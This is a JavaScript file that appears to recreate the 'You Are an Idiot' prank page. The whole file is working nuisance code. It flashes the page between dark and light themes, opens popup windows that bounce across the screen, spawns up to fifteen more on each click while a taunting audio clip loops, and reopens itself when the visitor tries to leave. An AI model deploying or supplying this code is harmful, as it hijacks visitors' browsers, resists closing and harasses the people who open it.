import "../scss/main.scss";

(function () {
	const screenWidth = window.screen.availWidth;
	const screenHeight = window.screen.availHeight;
	const screenMargin = 5;

	const popupWindowWidth = 480;
	const popupWindowHeight = 360;
	const popupWindowVelocity = 15;

	const isPopupWindow = window.opener;

	function moveCurrentWindow() {
		let velocityX = popupWindowVelocity * (Math.random() > 0.5 ? 1 : -1);
		let velocityY = popupWindowVelocity * (Math.random() > 0.5 ? 1 : -1);

		setInterval(() => {
			const windowPositionX = window.screenX;
			const windowPositionY = window.screenY;
			const width = window.outerWidth;
			const height = window.outerHeight;

			if (windowPositionX < screenMargin) {
				velocityX = Math.abs(velocityX);
			}

			if (windowPositionX + width > screenWidth - screenMargin) {
				velocityX = -1 * Math.abs(velocityX);
			}

			if (windowPositionY < screenMargin + screenMargin) {
				velocityY = Math.abs(velocityY);
			}

			if (windowPositionY + height > screenHeight - screenMargin) {
				velocityY = -1 * Math.abs(velocityY);
			}

			window.moveBy(velocityX, velocityY);
		}, 10);
	}

	function openNewPopupWindow() {
		const x = screenMargin + Math.floor(Math.random() * (screenWidth - popupWindowWidth - screenMargin));
		const y = screenMargin + Math.floor(Math.random() * (screenHeight - popupWindowHeight - screenMargin));

		window.open(window.location.pathname, "", `width=${popupWindowWidth},height=${popupWindowHeight},left=${x},top=${y}`);
	}

	const flashScreen = function () {
		let isLightMode = true;

		setInterval(() => {
			document.body.className = isLightMode ? "dark-mode" : "light-mode";
			isLightMode = !isLightMode;
		}, 1000);
	}

	const spawnPopupWindows = function (numberOfWindowsToSpawn) {
		for (let i = 0; i < numberOfWindowsToSpawn; i++) {
			openNewPopupWindow();
		}
	}

	window.onload = function () {
		flashScreen();

		if (isPopupWindow) {
			moveCurrentWindow();
			return;
		}

		spawnPopupWindows(2);
	}

	window.onbeforeunload = function () {
		setTimeout(window.open, 1, self.location, "");
	}

	document.addEventListener("click", function () {
		let youAreAnIdiotAudio = new Audio("./audio/you-are-an-idiot.mp3");
		youAreAnIdiotAudio.loop = true;
		youAreAnIdiotAudio.play();

		const maxWindowsToSpawn = 15;
		const minWindowsToSpawn = 1;
		const numberOfWindowsToSpawn = Math.floor(Math.random() * maxWindowsToSpawn) + minWindowsToSpawn;

		spawnPopupWindows(numberOfWindowsToSpawn);
	});
})();
